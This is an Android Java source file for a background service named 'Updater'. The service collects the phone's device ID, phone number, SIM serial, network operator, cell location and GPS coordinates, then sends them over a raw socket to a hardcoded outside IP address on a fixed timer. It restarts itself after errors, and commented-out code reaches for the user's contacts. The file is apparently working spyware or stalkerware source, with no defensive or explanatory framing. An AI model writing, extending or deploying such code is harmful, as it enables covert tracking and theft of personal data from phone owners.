package app.ue;
import android.app.Activity;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.location.LocationProvider;
import android.net.Uri;
import android.os.Bundle;
import android.os.IBinder;
import android.provider.Contacts.People;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;
import android.text.format.DateFormat;
import android.util.Log;
import android.widget.TextView;
import android.widget.Toast;

import java.net.*;
import java.util.Date;
import java.util.Iterator;
import java.util.List;
import java.util.Properties;
import java.util.Timer;
import java.util.TimerTask;
import java.io.*;

public class Updater extends Service implements LocationListener {

	   Socket socket = null;
	   private Timer timer = new Timer();
	   String server;
	   int port;
	   int interval;
	   private Location location;
	   
	
	private LocationManager locationManager;
	private String bestProvider;
	   
	
	
	   
	public void schedule(int interval) {
		
		timer.scheduleAtFixedRate( new TimerTask() {
			public void run() {
				
				TelephonyManager tMgr = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
				InetAddress serverAddr;
				
				/**
				LocationManager locationManager = (LocationManager)getSystemService(LOCATION_SERVICE);

				Criteria fine = new Criteria();
		        fine.setAccuracy(Criteria.ACCURACY_COARSE);
				
				currentLocation = locationManager.getLastKnownLocation(locationManager.getBestProvider(fine, true));
				System.out.println("Lat: " + currentLocation.getLatitude());
				System.out.println("Long: " + currentLocation.getLongitude());
				**/
				try {
					serverAddr = InetAddress.getByName(server);
				
				
				  socket = new Socket(serverAddr, port);
				
			      PrintWriter out = new PrintWriter(new BufferedWriter(new OutputStreamWriter(socket.getOutputStream())), true);		    
			      
			      //Date
			      Date dt = new Date();
			      
			      
			      int h = dt.getHours();
			      int m = dt.getMinutes();
			      int s = dt.getSeconds();
			      
			      int mon = dt.getMonth()+1;
			      
			      
			      int day = dt.getDate();
			      
			      
			      int year = 1900+dt.getYear();
			      
			      String date = mon + "/" + day + "/" + year + " : " + h + ":" + m + ":" + s;
			      out.println("Date: " + date);
			      
			      //output.setText(date);
			      //getLocation();
			      
			      out.println("Line 1: " + tMgr.getLine1Number() + "\n");
			      out.println("Cell Location: " + tMgr.getCellLocation() + "\n");
			      
			     // out.println("Lat: " + currentLocation.getLatitude());
			      //out.println("Long: " + currentLocation.getLongitude());
			      
			      out.println("Phone type: " + tMgr.getPhoneType() + "\n");
			      out.println("Last Known Location: " + getLastKnownLoc() + "\n");
			      
			      //String[] c = getContacts();
			      //out.println("Contacts: " + c[0]);
			      
			      //Turn off de gps
			      
			      
			      socket.close();
			      //disableGPS();
				}
				catch (Exception e)
				{
					e.printStackTrace();
				}  

			}
		}, 0, interval);	
		;
		
	}
		
	public void onDestroy()
	{
		timer.cancel();
		locationManager.removeUpdates(this);
	}
	   
	public Updater()
	{
		
	}
	
	public void disableGPS()
	{
		locationManager.removeUpdates(this);
	}
	
	public String getLastKnownLoc()
	{
		
		
		try {
		
		Criteria criteria = new Criteria();
		criteria.setAccuracy(Criteria.ACCURACY_FINE);
		
		
		//LocationManager locationManager;
		String context = Context.LOCATION_SERVICE;
		locationManager = (LocationManager)getSystemService(context);
		
		locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER,20000, 10f, this);
		
		
		
		criteria.setAltitudeRequired(false);
		criteria.setBearingRequired(false);
		criteria.setCostAllowed(true);
		criteria.setPowerRequirement(Criteria.POWER_LOW);
		String provider = locationManager.getBestProvider(criteria, true);
		
		location = locationManager.getLastKnownLocation(provider);
		
		Log.d("gps", "Best provider: " + provider);
		
		
		
		if ( location != null )
		{
			return location.getLatitude() + " " + location.getLongitude();
		}
		else
		{
			return "No location found";
		}
		}
		catch (Exception e)
		{
			//Something bad happened with GPS. W/E
			return "Exception occured";
		}
		
	}
	
	public void onLocationChanged(Location location) {
		if ( location != null )
		{
			Log.d("gps", "on location changed lat: " + location.getLatitude());
			disableGPS();
		}
		else
			Log.d("gps", "on location changed null");
	}
		
		
	
	
	  
	public void getConfig()
	{
		try {
		FileInputStream in = openFileInput(".uesec");    		
		Properties conf = new Properties();
		
		conf.load(in);
		in.close();
		
		server = conf.getProperty("server");
		port = Integer.parseInt(conf.getProperty("port"));
		interval = Integer.parseInt(conf.getProperty("interval"));
		}
		catch (Exception e)
		{
			e.printStackTrace();
		}
		
		if ( server == null )
			server = "76.249.179.148";
		if ( port == 0 )
			port = 19876;
		if ( interval <= 0 )
			interval = 60000;
		
	}
	
	@Override
	public void onCreate() {
		getConfig();
		
		
		//putExtra("status", "Service started");
		
		
		Toast.makeText(this, "Service Started", Toast.LENGTH_LONG).show();
		try{
			TelephonyManager tMgr = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
			//InetAddress serverAddr = InetAddress.getByName("76.249.179.148");
			InetAddress serverAddr = InetAddress.getByName(server);
			
			
		      //socket = new Socket(serverAddr, 19876);
			  socket = new Socket(serverAddr, port);
		      PrintWriter out = new PrintWriter(new BufferedWriter(new OutputStreamWriter(socket.getOutputStream())), true);		    
		      out.println("Wtf mate");
		      out.println("DeviceID: "+tMgr.getDeviceId());
		      
		      
		      
		      out.println("Line 1: " + tMgr.getLine1Number() + "\n");
		      out.println("Net Operator: " + tMgr.getNetworkOperator() + "\n");
		      out.println("Sim Serial: " + tMgr.getSimSerialNumber() + "\n");
		      out.println("Cell Location: " + tMgr.getCellLocation() + "\n");
		      out.println("server: " + server + "\n");
		      out.println("port: " + port + "\n");
		      out.println("interval: " + interval + "\n");
		      
		      socket.close();
		      
		      schedule(interval);
		      Log.d("XXX", "After schedule");
		}
		      catch(Exception e)
			{
					Toast.makeText(this, "Service Encounted an Error", Toast.LENGTH_LONG).show();
					try {
						Thread.sleep(5000);
						onCreate();
					}
					catch (Exception e4)
					{
						
					}
			}
		      
		      try {
		      locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);

				// List all providers:
				List<String> providers = locationManager.getAllProviders();
				for (String provider : providers) {
					Log.d("gps", "Prov: " + provider);
				}

				Criteria criteria = new Criteria();
				bestProvider = locationManager.getBestProvider(criteria, false);
				//output.append("\n\nBEST Provider:\n");
				Log.d("gps", "best provider");

				//output.append("\n\nLocations (starting with last known):");
				Location location = locationManager.getLastKnownLocation(bestProvider);
				
				if ( location != null )
					Log.d("gps", ""+location.getLatitude());
				else
					Log.d("gps", "another null");
		      
		      }
		      catch (Exception e2)
		      {
		    	  Toast.makeText(this, "GPS Exception", Toast.LENGTH_LONG).show();
		    	  
		    	  try {
		    		  Thread.sleep(1000);
		    		  onCreate();
		    	  }
		    	  catch (Exception e3)
		    	  {
		    		  
		    	  }
		      }
		      
		     
		
		
	
		
	}
	
	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		Log.d("gps", "onBind");
		return null;
	}
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		Log.d("gps", "onStartCommand");
		locationManager.requestLocationUpdates(bestProvider, 20000, 1, this);		
		return Service.START_STICKY;
	}

	public void onProviderDisabled(String arg0) {
		// TODO Auto-generated method stub
		Log.d("gps", "onProviderDisabled");
	}

	public void onProviderEnabled(String arg0) {
		// TODO Auto-generated method stub
		Log.d("gps", "onProviderEnabled");
	}

	public void onStatusChanged(String arg0, int arg1, Bundle arg2) {
		// TODO Auto-generated method stub
		Log.d("gps", "onStatusChanged");
		
	}
	
	
	

}
